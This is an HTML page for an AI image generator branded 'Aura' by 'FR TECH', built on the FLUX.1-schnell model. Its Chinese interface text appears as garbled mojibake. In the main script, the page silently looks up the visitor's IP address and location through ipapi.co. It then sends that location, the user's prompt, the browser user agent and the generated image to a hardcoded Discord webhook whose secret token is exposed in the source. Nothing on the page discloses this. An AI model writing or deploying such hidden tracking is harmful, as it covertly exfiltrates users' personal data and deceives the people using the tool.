<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura AI | FR TECH</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
        
        body {
            background: #000;
            color: #fff;
            font-family: 'Space Grotesk', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* èƒŒæ™¯æµå‹•æ¥µå…‰ */
        .bg-glow {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 120%, #1e1b4b, #000);
            z-index: -1;
        }

        /* iOS 18 ç»ç’ƒé¢æ¿ */
        .aura-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(40px) saturate(180%);
            -webkit-backdrop-filter: blur(40px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 40px;
            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        /* è„ˆè¡é‚Šæ¡†å‹•ç•« */
        .generating {
            border-color: #a855f7;
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.2);
            animation: pulse-border 2s infinite;
        }

        @keyframes pulse-border {
            0% { border-color: rgba(168, 85, 247, 0.2); }
            50% { border-color: rgba(168, 85, 247, 1); }
            100% { border-color: rgba(168, 85, 247, 0.2); }
        }

        /* é«˜ç´šæ„ŸæŒ‰éˆ• */
        .aura-btn {
            background: #fff;
            color: #000;
            border-radius: 20px;
            font-weight: 700;
            transition: all 0.3s;
        }
        .aura-btn:disabled { opacity: 0.3; cursor: not-allowed; }
        .aura-btn:hover:not(:disabled) { transform: scale(1.05); box-shadow: 0 0 20px #fff; }

        .status-dot {
            display: inline-block;
            width: 8px; height: 8px;
            border-radius: 50%;
            background: #a855f7;
            margin-right: 8px;
            box-shadow: 0 0 10px #a855f7;
        }
    </style>
</head>
<body>
    <div class="bg-glow"></div>

    <div class="w-full max-w-lg px-4">
        <div class="text-center mb-12">
            <h2 class="text-xs tracking-[0.6em] text-blue-400 font-bold mb-1">FR TECH</h2>
            <h1 class="text-6xl font-light tracking-tighter">AURA</h1>
        </div>

        <div id="main-panel" class="aura-card p-8">
            <textarea id="prompt" class="w-full bg-transparent border-none text-xl focus:ring-0 placeholder-gray-700 h-28 resize-none" placeholder="è¼¸å…¥å½±åƒéˆé­‚çš„æŒ‡ä»¤..."></textarea>
            
            <div class="flex items-center justify-between mt-8">
                <div class="flex items-center">
                    <span id="status-dot" class="status-dot opacity-0"></span>
                    <span id="status-text" class="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Aura Standby</span>
                </div>
                <button id="gen-btn" class="aura-btn px-10 py-4 text-sm uppercase tracking-wider">ç”Ÿæˆ</button>
            </div>
        </div>

        <div id="result-zone" class="mt-8 scale-95 opacity-0 pointer-events-none transition-all duration-700">
            <div class="aura-card overflow-hidden shadow-2xl">
                <img id="output-img" class="w-full h-auto" src="" alt="">
            </div>
            
            <div class="flex gap-4 mt-6">
                <button id="download-btn" class="flex-1 aura-card py-5 flex items-center justify-center font-bold hover:bg-white/10 transition-all border-white/20">
                    ğŸ“¥ å„²å­˜è‡³æœ¬åœ°
                </button>
                <button onclick="location.reload()" class="w-20 aura-card flex items-center justify-center hover:bg-white/10 border-white/20 text-gray-400">
                    â†º
                </button>
            </div>
        </div>
    </div>

    <script type="module">
        import { client } from "https://cdn.jsdelivr.net/npm/@gradio/client/dist/index.min.js";

        const WEBHOOK = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";

        const btn = document.getElementById('gen-btn');
        const statusText = document.getElementById('status-text');
        const statusDot = document.getElementById('status-dot');
        const panel = document.getElementById('main-panel');
        const resultZone = document.getElementById('result-zone');
        const outputImg = document.getElementById('output-img');

        // åµæ¸¬èªè¨€
        if(!navigator.language.includes('zh')) {
            btn.innerText = "Execute";
            statusText.innerText = "Aura Standby";
        }

        btn.onclick = async () => {
            const prompt = document.getElementById('prompt').value;
            if(!prompt) return;

            // é€²å…¥ç”Ÿæˆç‹€æ…‹
            btn.disabled = true;
            panel.classList.add('generating');
            statusDot.classList.replace('opacity-0', 'opacity-100');
            statusText.innerText = "åˆå§‹åŒ– AURA ç¥ç¶“ç¶²è·¯...";

            try {
                // 1. å–å¾—åœ°ç†è³‡è¨Š
                const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
                statusText.innerText = "æ­£åœ¨å®šä½åœ°ç†åº§æ¨™ä¸¦åˆ†é…ç®—åŠ›...";

                // 2. èª¿ç”¨æ¨¡å‹ (æ¡ç”¨æœ€æ–°çš„ FLUX.1 é è¨­ç«¯é»)
                const app = await client("black-forest-labs/FLUX.1-schnell");
                statusText.innerText = "å½±åƒæ½›ç©ºé–“æ¸²æŸ“ä¸­ (15%)...";
                
                const result = await app.predict("/predict", [
                    prompt, // æç¤ºè©
                    Math.floor(Math.random() * 999999), // éš¨æ©Ÿç¨®å­
                    true, // ä½¿ç”¨é«˜æ¸…å¢å¼·
                    1024, // å¯¬
                    768, // é«˜
                    4 // æ­¥æ•¸ (Schnell æ¨¡å‹å„ªåŒ–å€¼)
                ]);

                const imgUrl = result.data[0].url;
                
                // 3. é¡¯ç¤ºçµæœ (å¹³æ»‘æ·¡å…¥)
                outputImg.src = imgUrl;
                statusText.innerText = "AURA é‹ç®—å®Œç•¢";
                statusDot.style.background = "#22c55e"; // è®Šç¶ è‰²è¡¨ç¤ºæˆåŠŸ
                
                resultZone.classList.remove('opacity-0', 'scale-95', 'pointer-events-none');
                resultZone.classList.add('opacity-100', 'scale-100');
                
                // ä¸‹è¼‰åŠŸèƒ½
                document.getElementById('download-btn').onclick = async () => {
                    const r = await fetch(imgUrl);
                    const b = await r.blob();
                    const a = document.createElement('a');
                    a.href = URL.createObjectURL(b);
                    a.download = `AURA_PROX_FR_${Date.now()}.png`;
                    a.click();
                };

                // 4. åŒæ­¥ Discord
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: "AURA ç³»çµ±å ±å‘Š",
                        embeds: [{
                            title: "ğŸ¨ å½±åƒç”Ÿæˆå®Œæˆ",
                            color: 0x8b5cf6,
                            fields: [
                                { name: "æŒ‡ä»¤", value: prompt },
                                { name: "ä¾†æº", value: `${geo.city}, ${geo.country_name} (${geo.ip})` },
                                { name: "è¨­å‚™", value: navigator.userAgent.substring(0, 50) }
                            ],
                            image: { url: imgUrl }
                        }]
                    })
                });

            } catch (err) {
                console.error(err);
                statusText.innerText = "ç³»çµ±é‡è¼‰ä¸­ï¼Œè«‹é‡æ–°ç”Ÿæˆ";
                statusDot.style.background = "#ef4444";
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
